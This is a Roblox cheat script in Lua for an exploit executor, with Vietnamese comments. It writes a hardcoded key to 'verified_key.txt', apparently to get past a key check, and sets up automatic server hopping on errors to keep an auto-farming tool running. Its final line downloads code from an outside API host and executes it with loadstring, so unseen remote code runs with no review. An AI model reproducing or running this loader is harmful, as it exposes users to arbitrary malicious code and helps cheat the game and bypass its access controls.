local filename = "verified_key.txt"
local keyContent = "702adcbf-c2f9-4777-9523-22be719c0f98"

-- Thực hiện ghi file vào thư mục workspace của Executor
local success, err = pcall(function()
    writefile(filename, keyContent)
end)

if success then
    print("[Hệ thống] Đã tạo và lưu file verified_key.txt thành công!")
else
    warn("[Lỗi] Không thể ghi file. Lỗi: " .. tostring(err))
end
wait(0.5)
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local isHopping = false

-- Hàm Hop Server qua Replicated chuẩn từ script gốc của bạn
local function LocalServerHop()
    if isHopping then return end
    isHopping = true

    -- Cập nhật trạng thái hiển thị lên giao diện (nếu bảng UI gốc đang bật)
    pcall(function()
        local UI = CoreGui:FindFirstChild("AutoChest")
        if UI and UI:FindFirstChild("Holder") and UI.Holder.Shadow:FindFirstChild("MainBoard") then
            UI.Holder.Shadow.MainBoard.Subtitle.Text = "Status: [ Hopping Server... ]"
        end
    end)

    -- Gửi yêu cầu HTTP lấy danh sách các phòng public hiện tại
    local success, result = pcall(function()
        return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
    end)
    
    if success and result then
        local servers = HttpService:JSONDecode(result)
        local available = {}
        for _, s in pairs(servers.data) do
            if s.playing and s.maxPlayers and s.playing < s.maxPlayers and s.id ~= game.JobId then
                table.insert(available, s.id)
            end
        end
        if #available > 0 then
            local randomJobId = available[math.random(1, #available)]
            pcall(function()
                -- Kích hoạt lệnh nhảy server bằng ReplicatedStorage gốc của game
                ReplicatedStorage.__ServerBrowser:InvokeServer("teleport", randomJobId)
            end)
            return
        end
    end
    -- Dự phòng nếu danh sách API trống hoặc lỗi, tự force reconnect để chống treo tài khoản
    pcall(function() game:GetService("TeleportService"):Teleport(PlaceId, LocalPlayer) end)
end

-- 1. Bắt sự kiện lỗi hệ thống từ GuiService để xử lý chuyển server tức thì
GuiService.ErrorMessageChanged:Connect(function()
    if GuiService:GetErrorCode().Value > 0 then
        LocalServerHop()
    end
end)

-- 2. Bộ quét liên tục (Heartbeat) kiểm tra bảng báo lỗi xám đề phòng sự kiện trên nhận diện chậm
local PromptConnection
PromptConnection = RunService.Heartbeat:Connect(function()
    local promptGui = CoreGui:FindFirstChild("RobloxPromptGui")
    if promptGui then
        local promptFrame = promptGui:FindFirstChild("promptOverlay")
        if promptFrame and promptFrame.Visible == true then
            local errorPrompt = promptFrame:FindFirstChild("ErrorPrompt")
            if errorPrompt and errorPrompt.Visible == true then
                if PromptConnection then PromptConnection:Disconnect() end
                LocalServerHop()
            end
        end
    end
end)

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/66818a80c18e1105d29f0d1a3410023e412e39219020c1e7b1275fbc19a00d25/download"))()
